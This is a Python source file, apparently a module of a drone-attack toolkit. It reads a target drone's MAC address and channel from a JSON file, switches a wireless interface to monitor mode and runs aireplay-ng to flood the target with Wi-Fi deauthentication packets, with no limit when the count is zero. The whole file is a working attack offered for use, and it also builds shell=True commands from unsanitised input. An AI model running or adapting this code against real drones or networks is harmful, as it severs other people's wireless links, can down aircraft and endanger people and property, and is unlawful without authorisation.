import os
import json
import sys
import time
import subprocess

# Import sudo_exec - handle both direct and GUI execution contexts
try:
    from src.utils import sudo_exec
except ImportError:
    try:
        from utils import sudo_exec
    except ImportError:
        def sudo_exec(cmd):
            """Fallback implementation"""
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            return result

##################
### PREP MODULE ##
##################

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
try:
    with open(target_data_file, 'r') as file:
        scan_info = json.load(file)
except Exception as e:
    print(f"ERROR: Could not read target data file: {e}")
    sys.exit(1)

target_info = scan_info.get("target_info", {})
target_mac = target_info.get("mac_address")
target_channel = target_info.get("channel")

options_info = scan_info.get("options", {})
packets = options_info.get("packets")
interface = options_info.get("interface")

# Validate inputs
if not target_mac:
    print("ERROR: No target MAC address provided")
    sys.exit(1)

# Channel is optional - if not provided, don't set it
if not target_channel or target_channel == "N/A":
    print("WARNING: No target channel specified, will attempt deauth without channel restriction")
    target_channel = None
else:
    print(f"[*] Target Channel: {target_channel}")

if not interface:
    print("ERROR: No interface provided")
    sys.exit(1)

if not packets:
    print("WARNING: No packet count specified, defaulting to 0 (infinite)")
    packets = 0

print(f"[*] Target MAC: {target_mac}")
print(f"[*] Interface: {interface}")
print(f"[*] Packets to send: {packets}")

##################
## START MODULE ##
##################

try:
    # Put interface into monitor mode first
    print("[*] Setting interface to down...")
    result = sudo_exec(f"ifconfig {interface} down")
    if result.returncode != 0:
        print(f"WARNING: ifconfig down returned code {result.returncode}")
    
    time.sleep(1)
    
    print("[*] Setting interface to monitor mode...")
    result = sudo_exec(f"iwconfig {interface} mode monitor")
    if result.returncode != 0:
        print(f"WARNING: iwconfig mode monitor returned code {result.returncode}")
    
    time.sleep(1)
    
    print("[*] Setting interface to up...")
    result = sudo_exec(f"ifconfig {interface} up")
    if result.returncode != 0:
        print(f"WARNING: ifconfig up returned code {result.returncode}")
    
    time.sleep(1)

    # Verify monitor mode is enabled
    print("[*] Verifying monitor mode is enabled...")
    verify = subprocess.run(f"iwconfig {interface} | grep -i mode", shell=True, capture_output=True, text=True)
    print(verify.stdout.strip() if verify.stdout else "Could not verify monitor mode")

    # Targeting specific channel of target drone (optional)
    if target_channel:
        print(f"[*] Setting channel to {target_channel}...")
        result = sudo_exec(f"iwconfig {interface} channel {target_channel}")
        if result.returncode != 0:
            print(f"WARNING: iwconfig channel returned code {result.returncode}")
        time.sleep(1)
    else:
        print("[*] Skipping channel configuration (channel not specified)")

    # Deauth attack command
    print(f"[*] Starting deauth attack...")
    print(f"[*] Command: aireplay-ng -0 {packets} -a {target_mac} {interface}")
    
    # aireplay-ng
    # -0 : Deauth attack
    # packets : Number of deauth packets to send (0 = infinite)
    # -a : Target BSSID (MAC address)
    # target_mac : Target BSSID (MAC) from input file
    # interface : Network interface to use

    result = sudo_exec(f"aireplay-ng -0 {packets} -a {target_mac} {interface}")
    
    if result.returncode != 0:
        print(f"ERROR: aireplay-ng failed with return code {result.returncode}")
        print("\nDEBUG INFO:")
        print("Common causes:")
        print("1. Target network (BSSID: {}) not in range".format(target_mac))
        print("2. Interface not properly in monitor mode")
        print("3. MAC address is incorrect")
        print("\nYou can verify by running: iw {} scan".format(interface))
        sys.exit(1)
    else:
        sudo_exec(f"ifconfig {interface} down")
        sudo_exec(f"iwconfig {interface} mode managed")
        sudo_exec(f"ifconfig {interface} up")
        print("[+] Deauth attack completed successfully!")
        sys.exit(0)

except Exception as e:
    print(f"ERROR: Deauth module failed: {e}")
    sys.exit(1)

